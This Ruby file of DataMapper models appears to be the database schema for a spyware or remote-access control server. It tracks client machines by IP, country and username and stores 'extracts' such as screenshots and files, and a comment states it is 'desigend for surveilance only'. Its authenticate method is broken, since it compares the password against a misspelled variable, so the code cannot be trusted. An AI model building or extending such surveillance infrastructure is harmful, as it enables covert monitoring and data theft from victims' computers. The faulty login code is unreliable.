class User
    include BCrypt
    include DataMapper::Resource

    property :id, Serial, :key => true
    property :username, String, :length => 3..15
    property :password, BCryptHash

    # Authenticate the user with an attempted password
    #
    def authenticate(password)

        if(self.password == passwowrd)
                return true
        end

        return false
    end

end

class Client
    include DataMapper::Resource

    has n, :extracts


    property :id,          Serial
    property :created_at,  DateTime

    # Make sure we store there internal as well as there
    # external IP addresses incase they are behind NAT
    #
    property :external_ip, String, :length => 7..15
    property :internal_ip, String, :length => 7..15

    # Store misc other information,
    # this is desigend for surveilance only
    #
    property :country,     String
    property :version,     String
    property :status,      String
    property :username,    String


end

class Extract
    include DataMapper::Resource

    belongs_to :client

    property :id,          Serial

    # An extract contains infrormation such as screenshots
    # files and other things.
    #
    property :type,        String
    property :data,        String
    property :created_at,  DateTime
    property :description, String

end


